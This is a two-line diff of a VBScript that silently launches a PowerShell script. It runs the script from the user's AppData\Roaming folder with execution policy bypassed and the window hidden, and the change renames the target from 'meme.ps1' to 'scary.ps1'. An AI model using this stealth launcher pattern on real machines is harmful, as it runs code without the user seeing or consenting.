@@ -1,2 +1,2 @@
 Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File ""C:\Users\" & WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Roaming\meme.ps1""", 0, False
+objShell.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File ""C:\Users\" & WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Roaming\scary.ps1""", 0, False
